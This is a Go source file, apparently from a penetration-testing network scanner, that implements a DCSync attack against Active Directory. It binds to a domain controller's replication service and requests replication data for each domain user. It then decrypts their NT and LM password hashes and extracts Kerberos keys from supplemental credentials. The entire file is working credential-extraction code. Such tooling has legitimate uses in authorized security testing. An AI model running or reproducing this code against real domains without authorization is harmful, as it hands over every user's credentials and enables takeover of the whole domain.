package msrpc

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"fmt"

	msrpcfern "github.com/Method-Security/networkscan/generated/go/pentest/msrpc"
	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/midl/uuid"
	drsuapi "github.com/oiweiwei/go-msrpc/msrpc/drsr/drsuapi/v4"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	samr "github.com/oiweiwei/go-msrpc/msrpc/samr/samr/v1"
	"github.com/oiweiwei/go-msrpc/ndr"
	"github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/palantir/witchcraft-go-logging/wlog/svclog/svc1log"
)

// DRSUAPIClient provides functionality for interacting with the Directory Replication Service API
type DRSUAPIClient struct {
	Host        string
	Credentials credential.Credential
	client      drsuapi.DrsuapiClient
	handle      *drsuapi.Handle
	conn        dcerpc.Conn
}

// NewDRSUAPIClient creates a new DRSUAPI client
func NewDRSUAPIClient(host string, creds credential.Credential) *DRSUAPIClient {
	return &DRSUAPIClient{
		Host:        host,
		Credentials: creds,
	}
}

// Connect establishes a connection to the DRSUAPI service on the specified endpoint
func (c *DRSUAPIClient) Connect(ctx context.Context, drsuapiBinding dcerpc.StringBinding) error {
	log := svc1log.FromContext(ctx)

	// Create connection to DRSUAPI port
	drsuapiTarget := fmt.Sprintf("ncacn_ip_tcp:%s[%s]", c.Host, drsuapiBinding.Endpoint)

	conn, err := dcerpc.Dial(ctx, drsuapiTarget,
		dcerpc.WithCredentials(c.Credentials),
		dcerpc.WithSign(),
		dcerpc.WithSeal(),
		dcerpc.WithTargetName(c.Host),
	)
	if err != nil {
		log.Error("Failed to establish connection to DRSUAPI",
			svc1log.SafeParam("target", drsuapiTarget),
			svc1log.SafeParam("error", err.Error()))
		return fmt.Errorf("failed to connect to DRSUAPI on %s: %w", drsuapiTarget, err)
	}
	c.conn = conn

	log.Info("Successfully established connection to DRSUAPI", svc1log.SafeParam("target", drsuapiTarget))

	// Create DRSUAPI client
	client, err := drsuapi.NewDrsuapiClient(ctx, conn, dcerpc.WithSeal(), dcerpc.WithTargetName(c.Host))
	if err != nil {
		log.Error("Failed to create DRSUAPI client", svc1log.SafeParam("error", err.Error()))
		return fmt.Errorf("failed to create DRSUAPI client: %w", err)
	}
	c.client = client

	log.Info("Successfully created DRSUAPI client")
	return nil
}

// Bind performs the DRSBind operation to establish a session
func (c *DRSUAPIClient) Bind(ctx context.Context) error {
	log := svc1log.FromContext(ctx)

	// Create DRSBind request with required extensions
	extensionFlags := uint32(drsuapi.ExtGetNCChangesRequestV6 |
		drsuapi.ExtGetNCChangesReplyV6 |
		drsuapi.ExtGetNCChangesRequestV8 |
		drsuapi.ExtStrongEncryption |
		drsuapi.ExtNonDomainNCs)

	log.Debug("Using extension flags", svc1log.SafeParam("flags", fmt.Sprintf("0x%08x", extensionFlags)))

	// Create extension structure
	extensionsData := make([]byte, 32)
	// Pack the extension flags in little-endian format
	binary.LittleEndian.PutUint32(extensionsData[0:4], extensionFlags)

	clientExtensions := &drsuapi.Extensions{
		Length: 32,
		Data:   extensionsData,
	}

	// NTDSAPI_CLIENT_GUID
	clientGUID := &dtyp.UUID{
		Data1: 0xe24d201a,
		Data2: 0x4fd6,
		Data3: 0x11d1,
		Data4: []byte{0xa3, 0xda, 0x00, 0x00, 0xf8, 0x75, 0xae, 0x0d},
	}

	bindReq := &drsuapi.BindRequest{
		ClientDSA: clientGUID,
		Client:    clientExtensions,
	}

	bindResp, err := c.client.Bind(ctx, bindReq)
	if err != nil {
		log.Error("Failed to bind to DRSUAPI service", svc1log.SafeParam("error", err.Error()))
		return fmt.Errorf("failed to bind to DRSUAPI service: %w", err)
	}

	c.handle = bindResp.DRS
	log.Info("Successfully bound to DRSUAPI service")
	return nil
}

// ExtractAllUserCredentials extracts credentials for all users in the domain using DRSUAPI
func (c *DRSUAPIClient) ExtractAllUserCredentials(ctx context.Context, domain string, domainInfo *DomainInfo, config *msrpcfern.PentestMsrpcDcSyncConfig) ([]*msrpcfern.DcSyncUserEntry, int, int, error) {
	log := svc1log.FromContext(ctx)

	log.Debug("Starting DCSync credential extraction",
		svc1log.SafeParam("userCount", len(domainInfo.UserEntries)),
		svc1log.SafeParam("domain", domain))

	var extractedUsers []*msrpcfern.DcSyncUserEntry
	var successfulExtractions, failedExtractions int

	for _, userEntry := range domainInfo.UserEntries {
		username := userEntry.Username
		userRID := userEntry.RID

		// Construct user SID from domain SID + RID
		userSID := *domainInfo.DomainSID
		userSID.SubAuthority = append(userSID.SubAuthority, userRID)
		userSID.SubAuthorityCount++

		// Convert dtyp.SID to drsuapi.NT4SID
		sidBytes, err := userSID.Bytes()
		if err != nil {
			log.Error("Failed to encode user SID",
				svc1log.SafeParam("username", username),
				svc1log.SafeParam("error", err.Error()))
			failedExtractions++
			continue
		}

		nt4sid := &drsuapi.NT4SID{
			Data: sidBytes,
		}

		// Try SID-based approach first
		getChangesReq := &drsuapi.GetNCChangesRequest{
			Handle:    c.handle,
			InVersion: 8,
			In: &drsuapi.MessageGetNCChangesRequest{
				Value: &drsuapi.MessageGetNCChangesRequest_V8{
					V8: &drsuapi.MessageGetNCChangesRequestV8{
						DSAObjectDestination:      &dtyp.UUID{},
						InvocationIDSource:        &dtyp.UUID{},
						NC:                        &drsuapi.DSName{SID: nt4sid},
						From:                      &drsuapi.Vector{},
						UpToDateVectorDestination: nil,
						Flags:                     drsuapi.InitSync | drsuapi.GetAncestor | drsuapi.GetAllGroupMembership | drsuapi.WritableReplica,
						MaxObjectsCount:           1,
						MaxBytesCount:             0,
						ExtendedOperation:         drsuapi.ExtendedOperationReplicationObject,
						FSMOInfo:                  nil,
					},
				},
			},
		}

		getChangesResp, err := c.client.GetNCChanges(ctx, getChangesReq)
		if err != nil {
			// SID-based approach failed, try CrackNames fallback
			getChangesResp, err = c.tryFallbackWithCrackNames(ctx, username, &userSID)
			if err != nil {
				log.Error("Failed to get replication data for user via fallback",
					svc1log.SafeParam("username", username),
					svc1log.SafeParam("error", err.Error()))
				failedExtractions++
				continue
			}
		}

		// Extract credentials from the replication response
		userEntry, err := c.ExtractUserCredentials(ctx, username, domain, getChangesResp, config)
		if err != nil {
			log.Error("Failed to extract credentials from replication data",
				svc1log.SafeParam("username", username),
				svc1log.SafeParam("error", err.Error()))
			failedExtractions++
			continue
		}

		if userEntry != nil {
			extractedUsers = append(extractedUsers, userEntry)
			successfulExtractions++
		} else {
			failedExtractions++
		}
	}

	return extractedUsers, successfulExtractions, failedExtractions, nil
}

// tryFallbackWithCrackNames attempts to resolve user using CrackNames and retry GetNCChanges
func (c *DRSUAPIClient) tryFallbackWithCrackNames(ctx context.Context, username string, userSID *dtyp.SID) (*drsuapi.GetNCChangesResponse, error) {
	log := svc1log.FromContext(ctx)

	// Fallback to CrackNames approach
	crackedReq := &drsuapi.CrackNamesRequest{
		Handle:    c.handle,
		InVersion: 1,
		In: &drsuapi.MessageCrackNamesRequest{
			Value: &drsuapi.MessageCrackNamesRequest_V1{
				V1: &drsuapi.MessageCrackNamesRequestV1{
					FormatOffered: uint32(drsuapi.DSNameFormatSIDOrSIDHistoryName),
					FormatDesired: uint32(drsuapi.DSNameFormatUniqueIDName),
					Names:         []string{userSID.String()},
				},
			},
		},
	}

	crackedResp, err := c.client.CrackNames(ctx, crackedReq)
	if err != nil {
		log.Warn("Failed to crack name for user",
			svc1log.SafeParam("username", username),
			svc1log.SafeParam("error", err.Error()))
		return nil, fmt.Errorf("failed to crack name: %w", err)
	}

	v1Reply, ok := crackedResp.Out.Value.(*drsuapi.MessageCrackNamesReply_V1)
	if crackedResp.OutVersion != 1 || crackedResp.Out == nil || !ok || v1Reply.V1 == nil || v1Reply.V1.Result == nil || len(v1Reply.V1.Result.Items) == 0 || v1Reply.V1.Result.Items[0].Status != uint32(drsuapi.DSNameErrorNoError) {
		log.Warn("User not found in directory via CrackNames fallback",
			svc1log.SafeParam("username", username),
			svc1log.SafeParam("status", "unknown"))
		return nil, fmt.Errorf("user not found via CrackNames")
	}

	// Extract GUID from cracked name and retry GetNCChanges
	crackedItem := v1Reply.V1.Result.Items[0]
	userGUID := crackedItem.Name

	// Retry GetNCChanges with GUID
	getChangesReq := &drsuapi.GetNCChangesRequest{
		Handle:    c.handle,
		InVersion: 8,
		In: &drsuapi.MessageGetNCChangesRequest{
			Value: &drsuapi.MessageGetNCChangesRequest_V8{
				V8: &drsuapi.MessageGetNCChangesRequestV8{
					MaxObjectsCount: 1,
					NC: &drsuapi.DSName{
						GUID: dtyp.GUIDFromUUID(uuid.MustParse(userGUID)),
					},
					Flags:             drsuapi.InitSync | drsuapi.GetAncestor | drsuapi.GetAllGroupMembership | drsuapi.WritableReplica,
					ExtendedOperation: drsuapi.ExtendedOperationReplicationObject,
					FSMOInfo:          nil,
				},
			},
		},
	}

	return c.client.GetNCChanges(ctx, getChangesReq)
}

// ExtractUserCredentials extracts credentials from DRSUAPI replication data
func (c *DRSUAPIClient) ExtractUserCredentials(ctx context.Context, username, domain string, resp *drsuapi.GetNCChangesResponse, config *msrpcfern.PentestMsrpcDcSyncConfig) (*msrpcfern.DcSyncUserEntry, error) {
	log := svc1log.FromContext(ctx)
	v6Reply, ok := resp.Out.Value.(*drsuapi.MessageGetNCChangesReply_V6)
	if resp.OutVersion != 6 || resp.Out == nil || !ok || v6Reply.V6 == nil {
		return nil, fmt.Errorf("unexpected response level or no data for user %s", username)
	}

	info6 := v6Reply.V6
	if info6.ObjectsCount == 0 || info6.Objects == nil {
		return nil, fmt.Errorf("no objects returned for user %s", username)
	}

	obj := info6.Objects
	userEntry := &msrpcfern.DcSyncUserEntry{
		Username:          username,
		Domain:            domain,
		UserPrincipalName: &[]string{fmt.Sprintf("%s@%s", username, domain)}[0],
	}

	// Extract RID from objectSid for hash decryption - process SID first
	var userRID uint32

	// Process attributes from the replication object
	if obj.EntityInfo == nil || obj.EntityInfo.AttributeBlock == nil {
		return nil, fmt.Errorf("no attribute data for user %s", username)
	}

	// FIRST PASS: Extract RID from objectSid (MUST be done before decrypting hashes)
	for _, attr := range obj.EntityInfo.AttributeBlock.Attribute {
		if attr.AttributeType == 0x90092 { // objectSid
			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
				sidBytes := attr.AttributeValue.Values[0].Value
				log.Debug("Raw objectSid bytes",
					svc1log.SafeParam("sidBytesHex", hex.EncodeToString(sidBytes)),
					svc1log.SafeParam("sidLength", len(sidBytes)))

				// Parse SID structure
				var sid dtyp.SID
				if err := ndr.Unmarshal(sidBytes, &sid, ndr.Opaque); err == nil {
					// Extract RID from SID
					if len(sid.SubAuthority) > 0 {
						userRID = sid.SubAuthority[len(sid.SubAuthority)-1]
						// Store the SID string in the user entry
						sidStr := sid.String()
						userEntry.ObjectSid = &sidStr
						log.Debug("Extracted RID from parsed SID",
							svc1log.SafeParam("rid", userRID),
							svc1log.SafeParam("username", username),
							svc1log.SafeParam("objectSid", sidStr),
							svc1log.SafeParam("subAuthorityCount", len(sid.SubAuthority)))
					} else {
						log.Error("SID has no SubAuthority entries",
							svc1log.SafeParam("username", username))
					}
				} else {
					log.Error("Failed to parse SID",
						svc1log.SafeParam("error", err.Error()),
						svc1log.SafeParam("username", username))
				}
				break // Found SID, stop looking
			}
		}
	}

	// SECOND PASS: Process all other attributes including password hashes (now we have RID)
	var hasUnicodePwd bool
	for _, attr := range obj.EntityInfo.AttributeBlock.Attribute {
		switch attr.AttributeType {
		case 0x90092: // objectSid - already processed in first pass
			// Skip - RID already extracted in first pass
		case 0x9005E: // unicodePwd (NT hash)
			hasUnicodePwd = true
			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
				rawNtHashBytes := attr.AttributeValue.Values[0].Value

				// Decrypt hash using session key
				decryptedHashBytes, err := drsuapi.DecryptHash(c.client.Conn().Context(), userRID, rawNtHashBytes)
				if err != nil {
					log.Error("DecryptHash failed",
						svc1log.SafeParam("error", err.Error()),
						svc1log.SafeParam("username", username),
						svc1log.SafeParam("userRID", userRID),
						svc1log.SafeParam("rawNtHashHex", hex.EncodeToString(rawNtHashBytes)))
					continue
				}

				if err == nil {
					// NT hash should be exactly 16 bytes (128 bits)
					// If we get more data, take the first 16 bytes
					var ntHashBytes []byte
					if len(decryptedHashBytes) >= 16 {
						ntHashBytes = decryptedHashBytes[:16]
					} else {
						ntHashBytes = decryptedHashBytes
					}

					decryptedHash := hex.EncodeToString(ntHashBytes)
					userEntry.NtHash = &decryptedHash
				}
			} else {
				// Handle empty unicodePwd attribute (disabled accounts)
				emptyPasswordHash := "31d6cfe0d16ae931b73c59d7e0c089c0"
				userEntry.NtHash = &emptyPasswordHash
			}
		case 0x90054: // dBCSPwd (LM hash)
			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
				rawLmHashBytes := attr.AttributeValue.Values[0].Value
				// Use DRSUAPI session-based decryption for LM hash
				decryptedLmHashBytes, err := drsuapi.DecryptHash(c.conn.Context(), userRID, rawLmHashBytes)
				if err != nil {
					log.Debug("Failed to decrypt LM hash with go-msrpc DecryptHash",
						svc1log.SafeParam("error", err.Error()),
						svc1log.SafeParam("username", username))
					// Fallback to raw encrypted data
					lmHash := hex.EncodeToString(rawLmHashBytes)
					userEntry.LmHash = &lmHash
				} else {
					lmHash := hex.EncodeToString(decryptedLmHashBytes)
					userEntry.LmHash = &lmHash
				}
			}
		case 0x9005D: // ntPwdHistory - removed from schema
			// Skip password history processing
		case 0x9007D: // supplementalCredentials
			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
				rawSupplementalCredentials := attr.AttributeValue.Values[0].Value

				// Decrypt supplemental credentials using DRSUAPI session key
				decryptedSupplementalCreds, err := drsuapi.DecryptData(c.client.Conn().Context(), rawSupplementalCredentials)
				if err != nil {
					log.Error("Failed to decrypt supplemental credentials",
						svc1log.SafeParam("error", err.Error()),
						svc1log.SafeParam("username", username))
					continue
				}

				// Parse Kerberos keys from decrypted supplemental credentials
				userEntry.KerberosKeys = ParseKerberosKeys(ctx, decryptedSupplementalCreds, username)
			}
		}
	}

	// Handle users with no password data (disabled accounts)
	if !hasUnicodePwd {
		emptyPasswordHash := "31d6cfe0d16ae931b73c59d7e0c089c0" // NT hash for empty password
		userEntry.NtHash = &emptyPasswordHash
	}

	return userEntry, nil
}

// Unbind closes the DRSUAPI session
func (c *DRSUAPIClient) Unbind(ctx context.Context) error {
	log := svc1log.FromContext(ctx)

	if c.handle != nil {
		unbindReq := &drsuapi.UnbindRequest{DRS: c.handle}
		_, err := c.client.Unbind(ctx, unbindReq)
		if err != nil {
			log.Warn("Failed to unbind from DRSUAPI service", svc1log.SafeParam("error", err.Error()))
		}
	}
	return nil
}

// Close closes the connection to the DRSUAPI service
func (c *DRSUAPIClient) Close(ctx context.Context) error {
	if c.conn != nil {
		return c.conn.Close(ctx)
	}
	return nil
}

// ParseKerberosKeys parses Kerberos keys from supplemental credentials
func ParseKerberosKeys(ctx context.Context, data []byte, username string) []*msrpcfern.KerberosKeyEntry {
	log := svc1log.FromContext(ctx)
	keys := []*msrpcfern.KerberosKeyEntry{}

	if len(data) == 0 {
		return keys
	}

	// Parse USER_PROPERTIES structure
	userProperties := samr.UserProperties{}
	if err := ndr.Unmarshal(data, &userProperties, ndr.Opaque); err != nil {
		log.Error("Failed to unmarshal USER_PROPERTIES structure",
			svc1log.SafeParam("error", err.Error()),
			svc1log.SafeParam("username", username),
			svc1log.SafeParam("dataLength", len(data)))
		return keys
	}

	// Kerberos encryption types
	kerberosTypes := map[uint32]string{
		1:          "des-cbc-crc",
		3:          "des-cbc-md5",
		17:         "aes128-cts-hmac-sha1-96",
		18:         "aes256-cts-hmac-sha1-96",
		0xffffff74: "rc4_hmac",
	}

	// Use map to deduplicate keys based on keyType+keyValue combination
	keyMap := make(map[string]*msrpcfern.KerberosKeyEntry)

	// Process each user property to find Kerberos credentials
	for _, property := range userProperties.UserProperties {
		if property == nil {
			continue
		}

		propertyName := property.PropertyName

		// Look for Kerberos-related properties
		switch propertyName {
		case "Primary:Kerberos-Newer-Keys":
			// Parse the property value as KerberosStoredCredentialNew
			if property.PropertyValue != nil {
				if kerbStoredCredNew, ok := property.PropertyValue.Value.(*samr.UserProperty_PropertyValue_KerberosStoredCredentialNew); ok {
					creds := kerbStoredCredNew.KerberosStoredCredentialNew
					if creds != nil {
						// Extract current credentials
						for _, cred := range creds.Credentials {
							if cred != nil {
								keyTypeStr, exists := kerberosTypes[cred.KeyType]
								if !exists {
									keyTypeStr = fmt.Sprintf("unknown-0x%x", cred.KeyType)
								}

								keyValue := hex.EncodeToString(cred.KeyData)
								keyID := keyTypeStr + ":" + keyValue

								// Only add if not already present (deduplication)
								if _, exists := keyMap[keyID]; !exists {
									keyMap[keyID] = &msrpcfern.KerberosKeyEntry{
										KeyType:  keyTypeStr,
										KeyValue: keyValue,
									}
								}
							}
						}
					}
				}
			}

		case "Primary:Kerberos":
			// Parse the property value as KerberosStoredCredential
			if property.PropertyValue != nil {
				if kerbStoredCred, ok := property.PropertyValue.Value.(*samr.UserProperty_PropertyValue_KerberosStoredCredential); ok {
					creds := kerbStoredCred.KerberosStoredCredential
					if creds != nil {
						// Extract current credentials
						for _, cred := range creds.Credentials {
							if cred != nil {
								keyTypeStr, exists := kerberosTypes[cred.KeyType]
								if !exists {
									keyTypeStr = fmt.Sprintf("unknown-0x%x", cred.KeyType)
								}

								keyValue := hex.EncodeToString(cred.KeyData)
								keyID := keyTypeStr + ":" + keyValue

								// Only add if not already present (deduplication)
								if _, exists := keyMap[keyID]; !exists {
									keyMap[keyID] = &msrpcfern.KerberosKeyEntry{
										KeyType:  keyTypeStr,
										KeyValue: keyValue,
									}
								}
							}
						}
					}
				}
			}

		default:
			// Skip non-Kerberos properties (NTLM, WDigest, etc.)
		}
	}

	// Convert map back to slice
	for _, key := range keyMap {
		keys = append(keys, key)
	}

	return keys
}
